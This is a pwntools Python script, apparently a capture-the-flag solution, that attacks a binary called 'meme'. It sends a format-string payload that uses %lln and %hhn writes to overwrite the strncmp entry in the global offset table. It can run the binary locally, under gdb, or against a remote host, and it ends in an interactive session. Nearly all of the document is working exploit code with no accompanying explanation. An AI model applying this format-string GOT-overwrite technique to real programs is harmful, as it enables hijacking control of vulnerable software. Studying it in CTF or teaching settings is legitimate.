from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "meme").resolve().__str__()
# b * printf + 166

gdb_script = """
b *main+191
b *main+236
c
"""
# elf = ELF("./meme")
# win_addr = elf.got["win"]
# print(elf.got)

frame_size = 0x220  # 544
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


phrase_byte = b"2tRiViAl"
phrase = u64(phrase_byte, endianness="little")

print(f"Phrase is: {hex(phrase)}")

io = start()
# print(io.got["printf"])
res = io.recvuntil(delims="at ")
print("____________________________________")
target = io.recvline().decode("ascii").strip()


print(f"Target addr {target}")
target = int(target, base=16)
res = io.recvuntil(delims=": ")
print(res)
print("____________________________________")

# Find the offset
# tag = 8 * b"A" * 10
# fmt = "|".join(f"{i}: %{i}$p" for i in range(1, buff_size)).encode()
# payload = tag + b"|" + fmt
# io.sendline(payload)

# offset = 8
# # Write 2tRiViAl to the format,

# Minimal, deterministic payload:
# 1) %11$lln writes total printed count (0x11F6) into 0x4034f8 (low 2 bytes of strncmp@GOT)
# 2) %12$hhn writes the low 1 byte of the new count (0x40 from 0x1240) into 0x4034fa (3rd byte)
payload = b"%4598c%11$lln"  # 4598 (dec) == 0x11F6
payload += b"%74c%12$hhn"  # 4598+74=4672 (0x1240) == low byte 0x40
payload += p64(0x4034F8)  # %11$ -> strncmp@GOT
payload += p64(0x4034FA)  # %12$ -> strncmp@GOT+2

print(f"Sending payload: {payload}")
print(f"Payload size: {len(payload)}")
io.sendline(payload)

print("____________________________________")
res = io.recvlines(2)
print(res)


# io.sendline(b"A" * frame_size)

io.interactive()
